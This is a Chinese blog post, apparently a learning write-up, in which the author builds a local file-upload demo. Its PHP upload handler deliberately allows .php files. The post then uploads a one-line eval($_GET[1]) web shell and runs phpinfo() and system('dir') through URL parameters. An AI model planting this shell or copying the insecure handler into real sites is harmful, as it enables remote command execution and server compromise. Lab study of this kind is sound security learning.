---
title: 文件上传 Get
date: 2023-10-17T18:26:52+08:00
slug: c659435
description: 从文件生成漏洞延伸出来的一个简单研究
tags:
  - LEARN
categories:
  - DIG
---

# begin

  

>写了file upload的短分享ppt然后得到自己可以写一个demo的问题，于是开始。

  

在得到demotest这个可以使用的本地网站之前经历了一场405风暴。<br>

  

<!-- more -->

  

## 源代码

首先先写了网页代码，index.html和upload.php

```html

index.html

  

<html>

<head>

<meta charset="utf-8">

<title>demo2</title>

</head>

<body>

  

<form action="upload_file.php" method="post" enctype="multipart/form-data">

    <label for="file">文件名：</label>

    <input type="file" name="file" id="file"><br>

    <input type="submit" name="submit" value="提交">

</form>

  

</body>

</html>

```

  

```php

upload.php

  

<?php

// 允许上传的图片后缀

$allowedExts = array("gif", "jpeg", "jpg", "png","php");

$temp = explode(".", $_FILES["file"]["name"]);

echo $_FILES["file"]["size"];

$extension = end($temp);     // 获取文件后缀名

if ((($_FILES["file"]["type"] == "image/gif")

|| ($_FILES["file"]["type"] == "image/jpeg")

|| ($_FILES["file"]["type"] == "image/jpg")

|| ($_FILES["file"]["type"] == "image/pjpeg")

|| ($_FILES["file"]["type"] == "image/x-png")

|| ($_FILES["file"]["type"] == "image/png")

|| ($_FILES["file"]["type"] == "application/octet-stream"))

&& ($_FILES["file"]["size"] < 204800)   // 小于 200 kb

&& in_array($extension, $allowedExts))

{

    if ($_FILES["file"]["error"] > 0)

    {

        echo "错误：: " . $_FILES["file"]["error"] . "<br>";

    }

    else

    {

        echo "上传文件名: " . $_FILES["file"]["name"] . "<br>";

        echo "文件类型: " . $_FILES["file"]["type"] . "<br>";

        echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";

        echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"] . "<br>";

        // 判断当期目录下的 upload 目录是否存在该文件

        // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777

        if (file_exists("upload/" . $_FILES["file"]["name"]))

        {

            echo $_FILES["file"]["name"] . " 文件已经存在。 ";

        }

        else

        {

            // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下

            move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);

            echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];

        }

    }

}

else

{

    echo "非法的文件格式";

}

?>

```

  

<font size=1>php代码是有限制的（网上找的所以只是简单修改了限制条件）</font>

  

## 405 Method not allowed

然后我就GoLive<br>

<img src=https://github.com/66lueflam144/66lueflam144.github.io/blob/gh-pages/img/in-post/demo%E5%88%9D%E5%A7%8B%E5%8C%96.png>

<br>一切都很美好，然后上传文件

<img src=https://github.com/66lueflam144/66lueflam144.github.io/blob/gh-pages/img/in-post/405.png>

无论是什么文件都是405，405，405...<br>

抓耳挠腮到处找<br>

最后burp suite抓包获得Response

```response

...

Access-Control-Allow-Credentials:true

Allow:GET.HEAD,OPTIONS

...

```

  

可能是edge web server的限制吧——添加js、修改为Flask无果。于是通过phpstudy建立本地网站。<br>

  

建立网站，写好域名，选好根目录之后，把index.html和upload.php移入根目录中，打开网站运行成功，上传功能正常，可喜可贺，感天动地。

  

# Upload Method=GET file

  

## 上传ing and test

上传一个`get2.php`文件，内容为

```php

<? php eval($_GET[1]); ?>

```

  

与之前写的一句话木马都不一样，

- 这次使用的是`GET`方法

- 去除了eval()前面的@符号，不然看不到任何回显

  

上传成功之后回显文件上传到了`upload/，我们通过`eval()`函数的原理，对`1`进行赋值（替换）<br>

```

http://example.com/upload/get2.php?1=phpinfo();

```

  

就会看到phpinfo——说明上传成功也能被正确解析执行。<br>之前写的是`GET['shell']`，进行替换的时候被错误解析无法执行，报错*Parse error:syntax error, unexpected end of file:....:get2.php(1):eval()'d code on line 1*,因为对`shell`进行赋值都是`GET['xxx']`，会被当作是字符执行。<br>

  

测试通过之后，进行输出目录。

  

## dir

因为搭建网站的环境是windows，所以使用`dir`命令来输出目录，如果是linux就用`ls`。

  

查询<a href=https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/dir>dir官方文档</a>之后，构建：

  

```url

http://example.com/upload/get2.php?1=system(%27dir%20/b/s/w/o/p%27);

```

  

界面就回显了一排整齐的文件的所在地址

  

接下来还可以通过其他命令进入这些文件里面进行一些操作。
